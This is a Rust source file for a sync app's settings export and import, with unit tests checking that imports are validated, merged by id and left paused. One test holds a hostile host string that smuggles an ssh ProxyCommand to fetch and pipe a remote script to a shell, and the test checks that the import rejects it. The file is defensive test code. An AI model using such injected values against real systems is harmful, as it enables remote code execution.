use std::collections::HashSet;

use serde::{Deserialize, Serialize};

use crate::connection::Connection;
use crate::folder::Folder;
use crate::profile::Profile;
use crate::settings::{template_from_prefix, Theme};
use crate::store::Config;
use crate::template;

/// Bumped only if the shape changes incompatibly; import refuses anything newer
/// than it understands rather than silently dropping fields.
pub const BUNDLE_VERSION: u32 = 1;

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Bundle {
    pub version: u32,
    pub exported_at: u64,
    /// Omitted unless the user opts in: connections carry hostnames, usernames
    /// and key paths, which is infrastructure detail a shared file should not
    /// leak by default.
    #[serde(default)]
    pub connections: Vec<Connection>,
    #[serde(default)]
    pub folders: Vec<Folder>,
    #[serde(default)]
    pub profiles: Vec<Profile>,
    /// Omitted unless the user opts in: unlike profiles and connections, these
    /// are this machine's preferences, not setup a file should silently carry
    /// onto another machine by default.
    #[serde(default)]
    pub preferences: Option<Preferences>,
}

/// The subset of `Settings` an export can optionally carry: appearance and
/// what a new profile is seeded with. `openAtStartup`/`compact`/`paused` stay
/// out — those are this window's/this launch's state, not "defaults".
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Preferences {
    pub theme: Theme,
    pub default_excludes: Vec<String>,
    /// How files from before templates carry this. Still written, empty, because
    /// those versions refuse a file without it.
    #[serde(default)]
    pub default_remote_prefix: String,
    #[serde(default)]
    pub source_template: String,
    #[serde(default)]
    pub target_template: String,
    pub default_local_root: String,
    pub default_debounce_ms: u64,
}

impl Preferences {
    fn effective_target_template(&self) -> String {
        if self.target_template.trim().is_empty() {
            template_from_prefix(&self.default_remote_prefix)
        } else {
            self.target_template.clone()
        }
    }
}

#[derive(Debug, Default, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportSummary {
    pub profiles_added: usize,
    pub profiles_updated: usize,
    pub connections_added: usize,
    pub connections_updated: usize,
    /// Profiles whose connection is not in the file and not already known —
    /// they import, but cannot run until one is assigned.
    pub profiles_missing_connection: Vec<String>,
    /// Running profiles switched off because the import replaced the
    /// connection they send through.
    pub profiles_disabled: usize,
    /// Whether the file carried appearance/defaults and they were applied.
    pub preferences_applied: bool,
}

pub fn export(
    config: &Config,
    include_connections: bool,
    include_preferences: bool,
    exported_at: u64,
) -> Bundle {
    Bundle {
        version: BUNDLE_VERSION,
        exported_at,
        connections: if include_connections {
            config.connections.clone()
        } else {
            Vec::new()
        },
        folders: config.folders.clone(),
        profiles: config.profiles.clone(),
        preferences: if include_preferences {
            Some(Preferences {
                theme: config.settings.theme,
                default_excludes: config.settings.default_excludes.clone(),
                default_remote_prefix: String::new(),
                source_template: config.settings.source_template.clone(),
                target_template: config.settings.target_template.clone(),
                default_local_root: config.settings.default_local_root.clone(),
                default_debounce_ms: config.settings.default_debounce_ms,
            })
        } else {
            None
        },
    }
}

/// Which profiles a bundle changes the terms of: those it names, and those on a
/// connection it names, running or not. Only these have a queued "Sync now" to
/// withdraw. One on a profile the bundle never mentions is still what the user
/// asked for.
pub fn changes_terms_of(bundle: &Bundle) -> impl Fn(&Profile) -> bool {
    let profiles: HashSet<String> = bundle.profiles.iter().map(|p| p.id.clone()).collect();
    let connections: HashSet<String> = bundle.connections.iter().map(|c| c.id.clone()).collect();
    move |profile| profiles.contains(&profile.id) || connections.contains(&profile.connection_id)
}

/// Merge a bundle into the existing config, matching on id.
///
/// Merging rather than replacing means importing onto a populated app adds to
/// it instead of wiping it. Imported profiles always arrive **paused**: an
/// import should never silently start pushing files to someone else's server.
pub fn import(config: &mut Config, bundle: Bundle) -> Result<ImportSummary, String> {
    if bundle.version > BUNDLE_VERSION {
        return Err(format!(
            "This file was written by a newer version of SyncPoint (format {}, this build \
             understands {BUNDLE_VERSION}).",
            bundle.version
        ));
    }

    // A bundle is untrusted input — it is whatever file the user picked. These
    // are the checks save_connection would have run, which an import bypasses
    // entirely, and they run before anything is written so a bad record cannot
    // leave the config half-updated.
    for connection in &bundle.connections {
        connection
            .check_safe()
            .map_err(|e| format!("Connection \"{}\": {e}", connection.name))?;
    }
    if let Some(preferences) = &bundle.preferences {
        template::check_source(&preferences.source_template)?;
        template::check_target(&preferences.effective_target_template())?;
    }

    let mut summary = ImportSummary::default();
    // Connections are replaced by id, so a bundle can repoint an existing
    // profile at a host of its choosing.
    let mut repointed: HashSet<String> = HashSet::new();

    for incoming in bundle.connections {
        match config.connections.iter_mut().find(|c| c.id == incoming.id) {
            Some(existing) => {
                repointed.insert(incoming.id.clone());
                *existing = incoming;
                summary.connections_updated += 1;
            }
            None => {
                // A profile left pointing at this id, after its connection was
                // deleted, gets a destination from this bundle just the same.
                repointed.insert(incoming.id.clone());
                config.connections.push(incoming);
                summary.connections_added += 1;
            }
        }
    }

    for incoming in bundle.folders {
        match config.folders.iter_mut().find(|f| f.id == incoming.id) {
            Some(existing) => *existing = incoming,
            None => config.folders.push(incoming),
        }
    }

    let known: HashSet<String> = config.connections.iter().map(|c| c.id.clone()).collect();

    for mut incoming in bundle.profiles {
        incoming.enabled = false;
        if !known.contains(&incoming.connection_id) {
            summary.profiles_missing_connection.push(incoming.name.clone());
        }
        match config.profiles.iter_mut().find(|p| p.id == incoming.id) {
            Some(existing) => {
                *existing = incoming;
                summary.profiles_updated += 1;
            }
            None => {
                config.profiles.push(incoming);
                summary.profiles_added += 1;
            }
        }
    }

    // Imported profiles arrive paused so an import never starts sending files
    // on its own. A profile already here whose connection was just replaced has
    // the same problem — its destination changed underneath it — so it is
    // paused too, rather than syncing to a new host on its next run.
    for profile in config.profiles.iter_mut() {
        if profile.enabled && repointed.contains(&profile.connection_id) {
            profile.enabled = false;
            summary.profiles_disabled += 1;
        }
    }

    // A profile whose folder did not come with it belongs at the top level
    // rather than pointing at nothing.
    crate::folder::normalize(config);

    if let Some(preferences) = bundle.preferences {
        config.settings.target_template = preferences.effective_target_template();
        config.settings.theme = preferences.theme;
        config.settings.default_excludes = preferences.default_excludes;
        config.settings.source_template = preferences.source_template;
        config.settings.default_local_root = preferences.default_local_root;
        config.settings.default_debounce_ms = preferences.default_debounce_ms;
        summary.preferences_applied = true;
    }

    Ok(summary)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::settings::Settings;

    fn connection(id: &str) -> Connection {
        Connection {
            id: id.into(),
            name: format!("conn-{id}"),
            user: "deploy".into(),
            host: "example.com".into(),
            port: 22,
            identity_file: String::new(),
        }
    }

    fn profile(id: &str, connection_id: &str) -> Profile {
        Profile {
            id: id.into(),
            name: format!("profile-{id}"),
            source: "/tmp/src".into(),
            connection_id: connection_id.into(),
            remote_path: "/srv/data".into(),
            enabled: true,
            delete: true,
            excludes: vec![".git".into()],
            debounce_ms: 500,
            folder_id: None,
            position: 0,
        }
    }

    fn config() -> Config {
        Config {
            settings: Settings::default(),
            connections: vec![connection("c1")],
            folders: vec![],
            profiles: vec![profile("p1", "c1")],
        }
    }

    fn bundle(connections: Vec<Connection>, profiles: Vec<Profile>) -> Bundle {
        Bundle {
            version: BUNDLE_VERSION,
            exported_at: 0,
            connections,
            folders: vec![],
            profiles,
            preferences: None,
        }
    }

    #[test]
    fn an_unsafe_connection_is_refused_and_nothing_is_written() {
        // save_connection validates; an import bypassed it entirely, which is
        // what made a host of `-oProxyCommand=...` reachable without the user
        // ever typing one.
        let mut cfg = config();
        let mut hostile = connection("c2");
        hostile.host = "-oProxyCommand=curl${IFS}evil.sh|sh".into();

        let result = import(&mut cfg, bundle(vec![hostile], vec![]));
        assert!(result.is_err(), "an import must not accept a dash-host");
        assert_eq!(cfg.connections.len(), 1, "checked before anything is written");
    }

    #[test]
    fn replacing_a_connection_switches_off_the_profiles_that_used_it() {
        // The bundle reuses c1's id with a different host. p1 is already
        // enabled and running, and looks its connection up per sync — so
        // without this it would send to the new host on its next run.
        let mut cfg = config();
        assert!(cfg.profiles[0].enabled);

        let mut swapped = connection("c1");
        swapped.host = "attacker.example".into();
        let summary = import(&mut cfg, bundle(vec![swapped], vec![])).unwrap();

        assert_eq!(summary.connections_updated, 1);
        assert_eq!(summary.profiles_disabled, 1);
        assert!(!cfg.profiles[0].enabled, "left running against a new host");
    }

    #[test]
    fn a_new_connection_leaves_running_profiles_alone() {
        // Only a *replaced* connection changes where an existing profile
        // sends; adding one alongside must not disturb anything.
        let mut cfg = config();
        let summary = import(&mut cfg, bundle(vec![connection("c2")], vec![])).unwrap();

        assert_eq!(summary.connections_added, 1);
        assert_eq!(summary.profiles_disabled, 0);
        assert!(cfg.profiles[0].enabled);
    }

    #[test]
    fn connections_are_left_out_unless_requested() {
        let bundle = export(&config(), false, false, 0);
        assert!(bundle.connections.is_empty());
        assert_eq!(bundle.profiles.len(), 1);

        let with = export(&config(), true, false, 0);
        assert_eq!(with.connections.len(), 1);
    }

    #[test]
    fn preferences_are_left_out_unless_requested() {
        let bundle = export(&config(), false, false, 0);
        assert!(bundle.preferences.is_none());

        let with = export(&config(), false, true, 0);
        assert!(with.preferences.is_some());
    }

    #[test]
    fn a_bundle_round_trips_through_json() {
        let bundle = export(&config(), true, true, 1_700_000_000);
        let json = serde_json::to_string_pretty(&bundle).unwrap();
        let back: Bundle = serde_json::from_str(&json).unwrap();

        assert_eq!(back.version, BUNDLE_VERSION);
        assert_eq!(back.exported_at, 1_700_000_000);
        assert_eq!(back.profiles[0].name, "profile-p1");
        assert_eq!(back.connections[0].host, "example.com");
        assert!(back.preferences.is_some());
    }

    #[test]
    fn importing_applies_preferences_only_when_the_bundle_carries_them() {
        let mut target = config();
        target.settings.default_debounce_ms = 999;

        let summary = import(&mut target, bundle(vec![], vec![])).unwrap();
        assert!(!summary.preferences_applied);
        assert_eq!(target.settings.default_debounce_ms, 999, "left alone without opt-in");

        let mut incoming = bundle(vec![], vec![]);
        incoming.preferences = Some(Preferences {
            theme: Theme::Dark,
            default_excludes: vec!["*.log".into()],
            default_remote_prefix: String::new(),
            source_template: "~/dev/{slug}".into(),
            target_template: "/srv/{slug}".into(),
            default_local_root: "/Users/me".into(),
            default_debounce_ms: 250,
        });
        let summary = import(&mut target, incoming).unwrap();

        assert!(summary.preferences_applied);
        assert_eq!(target.settings.theme, Theme::Dark);
        assert_eq!(target.settings.default_excludes, vec!["*.log".to_string()]);
        assert_eq!(target.settings.source_template, "~/dev/{slug}");
        assert_eq!(target.settings.target_template, "/srv/{slug}");
        assert_eq!(target.settings.default_local_root, "/Users/me");
        assert_eq!(target.settings.default_debounce_ms, 250);
    }

    #[test]
    fn a_file_from_before_templates_still_imports_its_prefix() {
        let mut target = Config::default();
        let incoming: Bundle = serde_json::from_str(
            r#"{"version":1,"exportedAt":0,"preferences":{"theme":"dark",
                "defaultExcludes":[],"defaultRemotePrefix":"/srv/apps",
                "defaultLocalRoot":"","defaultDebounceMs":500}}"#,
        )
        .unwrap();

        import(&mut target, incoming).unwrap();

        assert_eq!(target.settings.target_template, "/srv/apps/{slug}");
    }

    #[test]
    fn an_exported_file_stays_readable_by_versions_before_templates() {
        // They require this field, and refuse the whole file without it.
        let mut config = Config::default();
        config.settings.target_template = "/srv/{slug}".into();

        let exported = serde_json::to_value(export(&config, false, true, 0)).unwrap();

        assert_eq!(exported["preferences"]["defaultRemotePrefix"], "");
        assert_eq!(exported["preferences"]["targetTemplate"], "/srv/{slug}");
    }

    #[test]
    fn an_import_refuses_a_template_it_could_never_use() {
        let bad = |source: &str, target: &str| Preferences {
            theme: Theme::Dark,
            default_excludes: vec![],
            default_remote_prefix: String::new(),
            source_template: source.into(),
            target_template: target.into(),
            default_local_root: String::new(),
            default_debounce_ms: 500,
        };
        for preferences in [bad("/x/{source_name}", ""), bad("", "relative/{slug}"), bad("", "/x/{nope}")] {
            let mut target = Config::default();
            let mut incoming = bundle(vec![], vec![]);
            incoming.preferences = Some(preferences);

            assert!(import(&mut target, incoming).is_err());
            assert_eq!(target.settings.target_template, "", "nothing half applied");
        }
    }

    #[test]
    fn an_import_only_changes_the_terms_of_what_it_names() {
        let mut named = profile("named", "elsewhere");
        named.enabled = true;
        let on_named_connection = profile("on-it", "c-named");
        let unrelated = profile("unrelated", "elsewhere");

        let changed = changes_terms_of(&bundle(vec![connection("c-named")], vec![profile("named", "x")]));

        assert!(changed(&named));
        assert!(changed(&on_named_connection));
        assert!(!changed(&unrelated));
    }

    #[test]
    fn a_connection_arriving_under_a_dangling_id_pauses_what_points_at_it() {
        // The profile's connection was deleted, so it was going nowhere. This
        // bundle would otherwise hand it a destination nobody has reviewed.
        let mut cfg = Config::default();
        let mut waiting = profile("p1", "c-gone");
        waiting.enabled = true;
        cfg.profiles.push(waiting);

        let summary = import(&mut cfg, bundle(vec![connection("c-gone")], vec![])).unwrap();

        assert!(!cfg.profiles[0].enabled);
        assert_eq!(summary.profiles_disabled, 1);
    }

    #[test]
    fn importing_merges_rather_than_replacing() {
        let mut target = config();
        let incoming = Bundle {
            version: BUNDLE_VERSION,
            exported_at: 0,
            folders: vec![],
            connections: vec![connection("c2")],
            profiles: vec![profile("p2", "c2")],
            preferences: None,
        };

        let summary = import(&mut target, incoming).unwrap();
        assert_eq!(summary.profiles_added, 1);
        assert_eq!(summary.connections_added, 1);
        // The pre-existing entries survive.
        assert_eq!(target.profiles.len(), 2);
        assert_eq!(target.connections.len(), 2);
    }

    #[test]
    fn matching_ids_update_in_place() {
        let mut target = config();
        let mut renamed = profile("p1", "c1");
        renamed.name = "renamed".into();

        let summary = import(
            &mut target,
            Bundle {
                version: BUNDLE_VERSION,
                exported_at: 0,
                folders: vec![],
                connections: vec![],
                profiles: vec![renamed],
                preferences: None,
            },
        )
        .unwrap();

        assert_eq!(summary.profiles_updated, 1);
        assert_eq!(summary.profiles_added, 0);
        assert_eq!(target.profiles.len(), 1);
        assert_eq!(target.profiles[0].name, "renamed");
    }

    #[test]
    fn imported_profiles_never_arrive_enabled() {
        let mut target = Config::default();
        import(
            &mut target,
            Bundle {
                version: BUNDLE_VERSION,
                exported_at: 0,
                folders: vec![],
                connections: vec![connection("c1")],
                // Exported while running, so enabled in the file.
                profiles: vec![profile("p1", "c1")],
                preferences: None,
            },
        )
        .unwrap();

        assert!(
            !target.profiles[0].enabled,
            "an import must not start pushing files on its own"
        );
    }

    #[test]
    fn profiles_without_their_connection_are_reported() {
        let mut target = Config::default();
        let summary = import(
            &mut target,
            Bundle {
                version: BUNDLE_VERSION,
                exported_at: 0,
                folders: vec![],
                // Exported without connections, so p1 points at nothing.
                connections: vec![],
                profiles: vec![profile("p1", "c1")],
                preferences: None,
            },
        )
        .unwrap();

        assert_eq!(summary.profiles_missing_connection, vec!["profile-p1"]);
        // Still imported, so the settings are not lost — just unusable until
        // a connection is assigned.
        assert_eq!(target.profiles.len(), 1);
    }

    #[test]
    fn a_newer_format_is_refused_rather_than_half_read() {
        let mut target = Config::default();
        let result = import(
            &mut target,
            Bundle {
                version: BUNDLE_VERSION + 1,
                exported_at: 0,
                folders: vec![],
                connections: vec![],
                profiles: vec![profile("p1", "c1")],
                preferences: None,
            },
        );
        assert!(result.is_err());
        assert!(target.profiles.is_empty(), "nothing may be applied on refusal");
    }
}
